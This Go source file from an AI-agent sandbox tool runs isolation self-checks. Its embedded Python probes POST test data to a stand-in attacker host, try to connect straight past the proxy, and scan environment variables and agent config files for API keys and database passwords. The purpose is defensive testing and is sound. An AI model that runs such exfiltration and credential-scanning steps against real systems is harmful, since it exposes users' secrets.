package service

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/shaoxier/AIofCage/internal/mcp"
	"github.com/shaoxier/AIofCage/internal/oauth"
	"github.com/shaoxier/AIofCage/internal/runtime"
	"github.com/shaoxier/AIofCage/internal/sandbox"
)

// 保留旧 API 类型以兼容命令行调用，界面统一称为隔离检查。
type Attack struct {
	ID       string `json:"id"`
	Title    string `json:"title"`
	Incident string `json:"incident,omitempty"`
	Layer    string `json:"layer"`
}
type AttackResult struct {
	Attack
	Status   string `json:"status"`
	Blocked  bool   `json:"blocked"`
	Skipped  bool   `json:"skipped"`
	Evidence string `json:"evidence"`
	// Controls are the positive samples a check needs before its negative result means anything.
	Controls []CheckControl `json:"controls,omitempty"`
	Note     string         `json:"note"`
}

// CheckControl is one positive sample: a setup where the probe must see what it looks for.
type CheckControl struct {
	Name   string `json:"name"`
	OK     bool   `json:"ok"`
	Detail string `json:"detail,omitempty"`
}

const (
	checkPassed       = "passed"
	checkProblem      = "problem"
	checkInconclusive = "inconclusive"
	checkSkipped      = "skipped"
)

var attacks = []Attack{
	{ID: "steal-env", Title: "凭据配置", Layer: "密钥占位符"},
	{ID: "exfil-domain", Title: "未授权域名请求", Layer: "出网规则"},
	{ID: "bypass-proxy", Title: "绕开代理直连公网", Layer: "网络路由"},
	{ID: "foreign-key", Title: "外来凭据请求", Layer: "凭据校验"},
	{ID: "dns-exfil", Title: "DNS 查询外传", Layer: "DNS 与路由"},
	{ID: "docker-socket", Title: "Docker 接口", Layer: "容器边界"},
	{ID: "vm-ports", Title: "虚拟机网关端口", Layer: "内部网络"},
	{ID: "project-boundary", Title: "项目以外的文件", Layer: "文件隔离"},
	{ID: "remote-mcp-direct", Title: "绕过网关直连远程 MCP", Layer: "MCP 网关"},
	{ID: "db-direct", Title: "直连数据库与密码配置", Layer: "可信连接器"},
}

func (a *App) ListIsolationChecks() []Attack                     { return append([]Attack(nil), attacks...) }
func (a *App) ListAttacks() []Attack                             { return a.ListIsolationChecks() }
func (a *App) SimulateAttacks(id string) ([]AttackResult, error) { return a.RunIsolationChecks(id) }

// 每项只使用测试数据；没有充分证据或执行失败时不判通过。
func (a *App) RunIsolationChecks(id string) ([]AttackResult, error) {
	if err := a.runtimeReady(); err != nil {
		return nil, err
	}
	sbx, err := a.store.Sandbox(id)
	if err != nil {
		return nil, err
	}
	a.securityMu.Lock()
	if a.isolationBusy[id] {
		a.securityMu.Unlock()
		return nil, errors.New("这个沙箱正在进行隔离检查，请等它完成")
	}
	if a.isolationBusy == nil {
		a.isolationBusy = map[string]bool{}
	}
	a.isolationBusy[id] = true
	a.securityMu.Unlock()
	defer func() { a.securityMu.Lock(); delete(a.isolationBusy, id); a.securityMu.Unlock() }()
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	if a.manager.Status(ctx, id).State != "running" {
		return nil, errors.New("请先启动沙箱")
	}
	// Helpers an interrupted check left behind would only get in the way.
	a.manager.RemoveProbes(ctx, id)
	secrets, _ := a.realSecrets(ctx, sbx)
	started := a.now()
	defer func() { a.demos.add(id, demoRun{Start: started, End: a.now()}) }()
	results := make([]AttackResult, 0, len(attacks))
	for _, check := range attacks {
		r := settle(a.runAttack(ctx, sbx, check))
		for _, secret := range secrets {
			leaked := strings.Contains(r.Evidence, secret) || strings.Contains(r.Note, secret)
			for _, control := range r.Controls {
				leaked = leaked || strings.Contains(control.Detail, secret)
			}
			if leaked {
				r.Status = checkProblem
				r.Evidence = "检查输出包含真实凭据（已隐去）"
				r.Controls = nil
				r.Note = "请停止该沙箱并检查凭据隔离。"
			}
		}
		// 兼容字段只由明确结论推导，不把证据不足算作阻止成功。
		r.Blocked = r.Status == checkPassed
		r.Skipped = r.Status == checkSkipped
		if len([]rune(r.Evidence)) > 1400 {
			r.Evidence = string([]rune(r.Evidence)[:1400]) + "…"
		}
		results = append(results, r)
	}
	a.rememberIsolation(id, results)
	return results, nil
}

// 仅在宿主比较/脱敏，秘密不传入检查脚本。
func (a *App) realSecrets(ctx context.Context, sbx sandbox.Sandbox) ([]string, error) {
	var refs []string
	for _, b := range append(append([]sandbox.Binding{}, sbx.Bindings...), sbx.AppliedBindings...) {
		if p, err := a.store.Provider(b.ProviderID); err == nil {
			refs = append(refs, p.KeyRef)
		}
	}
	for _, p := range sbx.AppliedProviders {
		refs = append(refs, p.KeyRef)
	}
	var values []string
	add := func(value string) {
		if len(value) >= 8 {
			values = append(values, value)
		}
	}
	for _, ref := range refs {
		if v, err := a.vault.Read(ctx, ref); err == nil {
			add(string(v))
			clear(v)
		}
	}
	for _, id := range sbx.MCP {
		// A service may keep its secret under its own Keychain item (e.g. a dedicated read-only
		// database account), so read the item the service records, not the default name.
		ref := mcp.KeyRefFor(id)
		if service, err := a.store.MCPService(id); err == nil && service.KeyRef != "" {
			ref = service.KeyRef
		}
		raw, err := a.vault.Read(ctx, ref)
		if err != nil {
			continue
		}
		// OAuth items hold JSON credentials: a leaked access or refresh token on its own must be
		// caught, not only the whole item.
		if creds, err := oauth.Parse(raw); err == nil {
			add(creds.AccessToken)
			add(creds.RefreshToken)
			add(creds.ClientSecret)
		} else {
			add(string(raw))
		}
		clear(raw)
	}
	// The management and connector tokens exist only in memory; the agent must not see them either.
	if a.manager != nil {
		for _, value := range a.manager.RuntimeSecrets(sbx.ID) {
			add(value)
		}
	}
	return values, nil
}

// settle keeps a negative result from passing when one of its positive samples failed: the probe
// may simply be unable to see what it looks for. A problem stays a problem.
func settle(r AttackResult) AttackResult {
	if r.Status != checkPassed {
		return r
	}
	for _, control := range r.Controls {
		if !control.OK {
			r.Status = checkInconclusive
			r.Note = "对照不成立：「" + control.Name + "」没有得到预期结果，所以不能下结论。" + r.Note
			return r
		}
	}
	return r
}

// 脚本输出严格 JSON；命令错误优先于脚本声称的结论。
func classifyCheck(check Attack, out []byte, execErr error) AttackResult {
	r := AttackResult{Attack: check, Status: checkInconclusive}
	if execErr != nil {
		r.Evidence = "检查命令执行失败：" + execErr.Error()
		r.Note = "执行失败不能证明隔离有效，请检查运行状态后重试。"
		return r
	}
	var value struct {
		Status   string `json:"status"`
		Evidence string `json:"evidence"`
		Note     string `json:"note"`
	}
	if json.Unmarshal(bytes.TrimSpace(out), &value) != nil || value.Evidence == "" {
		r.Evidence = "未取得完整检查结果"
		r.Note = "没有足够证据判断。"
		return r
	}
	switch value.Status {
	case checkPassed, checkProblem, checkInconclusive:
		r.Status = value.Status
	}
	r.Evidence = value.Evidence
	r.Note = value.Note
	return r
}

const checkPython = `import os,sys,json,socket,errno,re,subprocess,pathlib

def result(status,evidence,note):
    print(json.dumps(dict(status=status,evidence=evidence,note=note),ensure_ascii=False))

blocked_errors=(errno.ENETUNREACH,errno.EHOSTUNREACH,errno.EACCES,errno.EPERM)

def connect(host,port):
    s=socket.socket();s.settimeout(3)
    try:
        s.connect((host,port));return "connected"
    except OSError as e:
        return "blocked" if e.errno in blocked_errors else type(e).__name__
    finally:
        s.close()

def curl(url,headers=()):
    args=["curl","--silent","--show-error","--max-time","12","--dump-header","-","--output","/dev/null","--request","POST","--data","aiofcage-isolation-probe"]
    for h in headers: args.extend(["--header",h])
    p=subprocess.run(args+[url],capture_output=True,text=True,timeout=15)
    codes=re.findall(r"(?im)^HTTP/[^ ]+ ([0-9]{3})(?![^\r\n]*Connection established)",p.stdout)
    reasons=re.findall(r"(?im)^x-aiofcage-reason: *([^\r\n]+)",p.stdout)
    return codes,reasons,p.returncode

def curl_check(url,headers,expected):
    codes,reasons,code=curl(url,headers)
    status="passed" if "403" in codes and expected in reasons else "problem" if codes and 200<=int(codes[-1])<400 else "inconclusive"
    result(status,"HTTP "+(" / ".join(codes) or "无响应")+"；代理原因："+(" / ".join(reasons) or "未取得")+"；curl 退出码 "+str(code),"仅验证本次请求和返回原因。网络错误、超时或其他拒绝原因不判通过。")

# Denials the gatekeeper gives before anything is sent to the service.
BEFORE_UPSTREAM={"default_deny","rule_denied","port_denied","plain_http_denied","target_mismatch"}

def direct_check(urls):
    rows=[];statuses=[]
    for url in urls:
        codes,reasons,code=curl(url)
        if "403" in codes and reasons and set(reasons)<=BEFORE_UPSTREAM: status="passed"
        elif codes and (not reasons or set(reasons)&{"redirect_denied","upstream_failed","upstream_status"} or 200<=int(codes[-1])<400): status="problem"
        else: status="inconclusive"
        statuses.append(status)
        rows.append(re.sub(r"^https?://([^/:]+).*$",r"\1",url)+"：HTTP "+(" / ".join(codes) or "无响应")+"，代理原因 "+(" / ".join(reasons) or "未取得"))
    status="problem" if "problem" in statuses else "passed" if statuses and all(s=="passed" for s in statuses) else "inconclusive"
    result(status,"；".join(rows),"不带任何凭据，经代理直接请求每个远程 MCP 服务。只有门卫在请求发出前就拒绝才算通过；请求到过服务（包括服务返回 401 或跳转）就是发现问题。")
`

func (a *App) runAttack(ctx context.Context, sbx sandbox.Sandbox, check Attack) AttackResult {
	var script string
	switch check.ID {
	case "steal-env":
		script = `
names=[];suspects=[]
for k,v in os.environ.items():
    if re.search(r"(api_?key|token|secret|password)$",k,re.I) and v:
        names.append(k)
        if not v.startswith("cage-"): suspects.append(k)
files=[".aiofcage/env",".codex/config.toml",".claude.json",".dsh/cordis.patch.yml"]
found=[]
for f in files:
    p=pathlib.Path.home()/f
    if p.is_file():
        text=p.read_text(errors="replace")
        if re.search(r"(?:sk-[a-zA-Z0-9]{12,}|(?:postgres|postgresql)://[^\s\"]*:[^\s\"]*@)",text): found.append(f)
result("problem" if suspects or found else "passed" if names else "inconclusive","已检查凭据变量："+(", ".join(names) or "无")+"；非占位变量名："+(", ".join(suspects) or "无")+"；疑似凭据配置文件："+(", ".join(found) or "无"),"检查已知配置位置与凭据变量，不扫描项目或历史记录，也不输出凭据值。")`
	case "exfil-domain":
		script = `curl_check("https://upload.attacker-collector.example/isolated-probe",[],"default_deny")`
	case "foreign-key":
		host, path := a.firstProviderEndpoint(sbx)
		if host == "" {
			return AttackResult{Attack: check, Status: checkSkipped, Note: "没有生效的模型供应商。"}
		}
		url, _ := json.Marshal("https://" + host + path)
		script = "curl_check(" + string(url) + `,["Authorization: Bearer aiofcage-test-foreign-credential","x-api-key: aiofcage-test-foreign-credential"],"credential_foreign")`
	case "bypass-proxy":
		script = `
observations=[(host,connect(host,443)) for host in ("223.5.5.5","1.1.1.1")]
status="problem" if any(v=="connected" for _,v in observations) else "passed" if all(v=="blocked" for _,v in observations) else "inconclusive"
result(status,"；".join(host+":443 "+value for host,value in observations),"socket 直接测试两个 IPv4 地址，不发送应用数据；超时和连接拒绝不足以证明无出网能力。")`
	case "dns-exfil":
		return a.checkDNS(ctx, sbx, check, a.inAgent(sbx))
	case "docker-socket":
		return a.checkDockerSocket(ctx, sbx, check, a.inAgent(sbx))
	case "vm-ports":
		return a.checkVMPorts(ctx, sbx, check, a.inAgent(sbx))
	case "project-boundary":
		return a.checkProjectBoundary(ctx, sbx, check, a.inAgent(sbx))
	case "remote-mcp-direct":
		urls := a.remoteMCPAddresses(sbx)
		if len(urls) == 0 {
			return AttackResult{Attack: check, Status: checkSkipped, Note: "没有启用远程 MCP 服务。"}
		}
		targets, _ := json.Marshal(urls)
		script = "direct_check(" + string(targets) + ")"
	case "db-direct":
		address := a.databaseAddress(sbx)
		if address == "" {
			return AttackResult{Attack: check, Status: checkSkipped, Note: "没有启用数据库 MCP。"}
		}
		host, port, err := net.SplitHostPort(address)
		if err != nil {
			return classifyCheck(check, nil, err)
		}
		// The agent has no DNS at all, so it tries the address the egress side resolves the name to;
		// a connection from there also shows the database is up.
		reach := "没有取得"
		if out, err := a.manager.RunProbe(ctx, sbx.ID, runtime.Probe{Network: runtime.ProbeEgress,
			Command: pythonCommand(dbControlPython, host, port)}); err == nil {
			var control struct{ IP, Reach string }
			if json.Unmarshal(bytes.TrimSpace(out), &control) == nil {
				reach = control.Reach
				if control.IP != "" {
					host = control.IP
				}
			}
		}
		target, _ := json.Marshal(host)
		evidence, _ := json.Marshal("；出网侧对照连接数据库：" + reach)
		script = fmt.Sprintf(`
found=[]
for f in (".claude.json",".codex/config.toml",".aiofcage/env"):
    p=pathlib.Path.home()/f
    if p.is_file() and re.search(r"(?:postgres|postgresql)://[^\s\"]*:[^\s\"]*@",p.read_text(errors="replace")): found.append(f)
observed=connect(%s,int(%q))
result("problem" if found or observed=="connected" else "passed" if observed=="blocked" else "inconclusive","疑似密码连接串文件："+(", ".join(found) or "无")+"；数据库直连："+observed+%s,"只尝试建立 TCP 连接，不登录、不执行数据库操作；超时不能证明隔离。")`, string(target), port, evidence)
	default:
		return AttackResult{Attack: check, Status: checkSkipped, Note: "未支持的检查项。"}
	}
	var out bytes.Buffer
	err := a.manager.Exec(ctx, sbx.ID, false, nil, &out, &out, pythonCommand(checkPython+"\n"+script)...)
	return classifyCheck(check, out.Bytes(), err)
}

// dbControlPython resolves the database host from the egress network and connects to it.
const dbControlPython = `import socket,sys,json
host,port=sys.argv[1],int(sys.argv[2])
try: ip=socket.gethostbyname(host)
except OSError: print(json.dumps(dict(ip="",reach="解析失败")));sys.exit()
try:
    with socket.create_connection((ip,port),timeout=3): reach="已连接"
except OSError as e: reach=type(e).__name__
print(json.dumps(dict(ip=ip,reach=reach),ensure_ascii=False))
`

// remoteMCPAddresses returns the upstream addresses of the sandbox's remote MCP services: the agent
// reaches them only through the gatekeeper's MCP gateway, never through the proxy.
func (a *App) remoteMCPAddresses(sbx sandbox.Sandbox) []string {
	var urls []string
	for _, id := range sbx.MCP {
		service, err := a.store.MCPService(id)
		if err != nil || service.IsConnector() || service.IsBuiltin() {
			continue
		}
		if url, err := service.Upstream(); err == nil {
			urls = append(urls, url)
		}
	}
	return urls
}

// databaseAddress returns where the sandbox's first database service is reached from the VM.
func (a *App) databaseAddress(sbx sandbox.Sandbox) string {
	for _, id := range sbx.MCP {
		if service, err := a.store.MCPService(id); err == nil && service.IsConnector() {
			if address, err := service.Address(); err == nil {
				return address
			}
		}
	}
	return ""
}

// firstProviderEndpoint returns the host and model API path of the first bound provider.
func (a *App) firstProviderEndpoint(sbx sandbox.Sandbox) (string, string) {
	bindings := sbx.Bindings
	if sbx.AppliedProviders != nil {
		bindings = sbx.AppliedBindings
	}
	for _, binding := range bindings {
		if binding.ProviderID == "" {
			continue
		}
		p, ok := sbx.AppliedProviders[binding.ProviderID]
		if !ok {
			var err error
			p, err = a.store.Provider(binding.ProviderID)
			if err != nil {
				continue
			}
		}
		rules := p.Rules()
		host, _, err := p.Endpoint()
		if err != nil || len(rules) == 0 {
			continue
		}
		return host, strings.TrimSuffix(rules[0].Path, "/*")
	}
	return "", ""
}

// demoLog remembers when the built-in attack demo ran in each sandbox, so the AI commentary can
// tell demo traffic apart from what the agent did on its own.
type demoLog struct {
	mu   sync.Mutex
	runs map[string][]demoRun
}

type demoRun struct {
	Start time.Time `json:"start"`
	End   time.Time `json:"end"`
}

// demoMargin absorbs clock skew between the VM (event times) and the Mac.
const demoMargin = 5 * time.Second

func (d *demoLog) add(id string, run demoRun) {
	d.mu.Lock()
	defer d.mu.Unlock()
	if d.runs == nil {
		d.runs = map[string][]demoRun{}
	}
	d.runs[id] = append(d.runs[id][max(0, len(d.runs[id])-9):], run)
}

func (d *demoLog) list(id string) []demoRun {
	d.mu.Lock()
	defer d.mu.Unlock()
	return append([]demoRun(nil), d.runs[id]...)
}

func (d *demoLog) contains(id string, t time.Time) bool {
	for _, run := range d.list(id) {
		if !t.Before(run.Start.Add(-demoMargin)) && !t.After(run.End.Add(demoMargin)) {
			return true
		}
	}
	return false
}
